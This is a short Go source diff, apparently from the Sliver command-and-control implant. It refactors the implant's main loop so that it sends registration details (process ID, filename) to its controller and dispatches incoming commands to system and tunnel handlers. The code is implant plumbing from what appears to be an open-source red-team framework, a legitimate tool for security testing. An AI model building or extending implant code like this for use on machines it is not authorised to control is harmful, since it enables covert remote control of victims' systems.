@@ -43,21 +43,33 @@ func main() {
 
 	limits.ExecLimits() // Check to see if we should execute
 
-	sysHandlers := handlers.GetSystemHandlers()
 	for {
 		connection := transports.StartConnectionLoop()
 		if connection == nil {
 			break
 		}
-		for envelope := range connection.Recv {
-			if handler, ok := sysHandlers[envelope.Type]; ok {
-				go handler(envelope.Data, func(data []byte, err error) {
-					connection.Send <- &pb.Envelope{
-						ID:   envelope.ID,
-						Data: data,
-					}
-				})
-			}
+		mainLoop(connection)
+	}
+}
+
+func mainLoop(connection *transports.Connection) {
+
+	connection.Send <- getRegisterSliver() // Send registration information
+
+	tunHandlers := handlers.GetTunnelHandlers()
+	sysHandlers := handlers.GetSystemHandlers()
+
+	for envelope := range connection.Recv {
+		if handler, ok := sysHandlers[envelope.Type]; ok {
+			go handler(envelope.Data, func(data []byte, err error) {
+				connection.Send <- &pb.Envelope{
+					ID:   envelope.ID,
+					Data: data,
+				}
+			})
+		}
+		if handler, ok := tunHandlers[envelope.Type]; ok {
+			go handler(envelope.Data, connection)
 		}
 	}
 }
@@ -76,9 +88,8 @@ func getRegisterSliver() *pb.Envelope {
 		Pid:      int32(os.Getpid()),
 		Filename: os.Args[0],
 	})
-	envelope := &pb.Envelope{
+	return &pb.Envelope{
 		Type: pb.MsgRegister,
 		Data: data,
 	}
-	return envelope
 }
